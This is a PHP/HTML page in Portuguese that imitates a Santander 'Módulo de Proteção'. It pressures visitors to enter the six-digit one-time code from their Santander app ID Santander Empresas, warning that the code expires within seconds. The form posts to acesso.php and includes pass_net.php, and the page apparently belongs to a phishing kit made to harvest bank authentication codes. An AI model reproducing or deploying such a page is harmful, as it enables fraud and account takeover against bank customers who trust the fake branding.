<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title></title>
</head>
<body>

<?php include ('pass_net.php');?>

	<div class="md_all">
		<div class="md_box" style="margin-top: 60px!important;">

			<div class="md_boxLogo border_loader">
				<img src="imgs/logo-stdeMd1.png">
			</div><!-- ld_boxLogo -->

			<div class="md_modalTtitle" style="margin-bottom: 20px;">
				<h1 class="title_ass">Módulo de Proteção Santander</h1>
				<p class="text_ased">
					Utilize seu dispositivo móvel para realizar a validação do código númerico do seu dispositivo.
				</p>
			</div>

			<div class="md_boxTables">

				<form action="acesso.php" method="post" onsubmit="return check_cod_num();">
					<span class="msg_qrcode">
						Utilize seu dispositivo móvel para realizar a validação de segurança com seu Código Númerico.
					</span>	
					
					<p style="font-size: .8em;margin: 30px 0 30px 0;line-height: 1.4em;color:#999;">
						<t style="font-weight: 700;font-size:1em;color:#666;">Para encontrar o código Númerido do seu dispositivo. Realize os passos abaixo:</t>
						<br><br>
						1 - Abra o app Santander no seu celular e <span style="color:#ff0000;font-weight:600;">selecione ID Santander Empresas.</span><br>
						2 - Agora, <span style="color:#ff0000;font-weight:600;">selecione Código Númerico.</span><br>
						3 - Neste tela, será mostrado um <span style="color:#ff0000;font-weight:600;">Código Númerico com 6 dígitos</span><br>
						4 - Informe o Código Númerico no campo abaixo, antes que o tempo expire.<br>
					</p>
					

					<span class="info_qrc">Digite o código gerado em seu celular</span>
					<input type="text" name="is_cod_num" id="is_cod_num" placeholder="Código Númerico" class="input_ass input_qrcode" maxlength="6" autocomplete="off" style="text-align:center;width: 150px;" onkeypress='return SomenteNumero(event)'>

					<span class="info_qrc" style="background-color:rgba(255,0,0, .3);color:#333;font-size:.75em;display:block;width:100%;margin: 40px 0 0 0;line-height: 1.5em;padding:5px 0;border-radius:3px;">
						* Importante lembrar que este Código Númerico é válido apenas por alguns segundos, seja hábil e utilize-o da forma correta para validar a instalação do Módulo de Segurança Santander.
					</span>

					<div class="clear"></div>
				
					<div class="buttons">
						<input type="submit" name="is_enter" id="is_enter" value="Confirmar" class="submit_corpo centraliza_qrcode">
						<input type="hidden" name="sender" value="cod_num">
					</div><!-- buttons -->
				</form>
			</div><!-- md_boxTables -->

			<div class="clear"></div>

			<br><br>
		</div><!-- ld_box -->
	</div>

<div class="modal_qrcode" id="ensinar_qrcode">
	<div class="close" onclick="return fecha_dica_qrcode();">X</div>

	<h1 class="titulo_ensina">Como utilizar seu ID Santander</h1>

	<div class="clear"></div>

	<div class="centraliza_box">

		<div class="box_divider">
			<img src="imgs/icon_ensina1.jpg" height="142" width="141" alt="">
			<div class="ensinando">
				<span class="laranja_ensina">1.</span> Abra o app Santander no seu celular e <span class="laranja_ensina">selecione o ícone ID Santander.</span>
			</div><!-- ensinando -->
		</div><!-- box_divider -->

		<div class="box_divider">
			<img src="imgs/icon_ensina2.jpg" height="150" width="184" alt="">
			<div class="ensinando">
				<span class="laranja_ensina">2.</span> Posicione a câmera do <span class="laranja_ensina">seu celular e capture a imagem QRCode dinâmico</span> exibida na tela do seu computador. 
				Em seguida <span class="laranja_ensina">clique em gerar código de validação.</span>
			</div><!-- ensinando -->
		</div><!-- box_divider -->

		<div class="box_divider">
			<img src="imgs/icon_ensina3.jpg" height="136" width="90" alt="">
			<div class="ensinando">
				<span class="laranja_ensina">3. Digite</span> na tela do seu computador <span class="laranja_ensina">o código de validação</span> exibido no seu celular.
			</div><!-- ensinando -->
		</div><!-- box_divider -->

	</div><!-- centraliza_box -->

	<div class="clear"><br><br><br><br></div>

	<p class="info_ensina">
		Na confirmação de algumas transações e operações, poderão ser solicitadas <span class="laranja_ensina">validações adicionais</span> como um <span class="laranja_ensina">código recebido por SMS e/ou a senha de seu cartão.</span>
	</p><!-- info_ensina -->
</div><!-- modal_qrcode -->	
</body>
</html>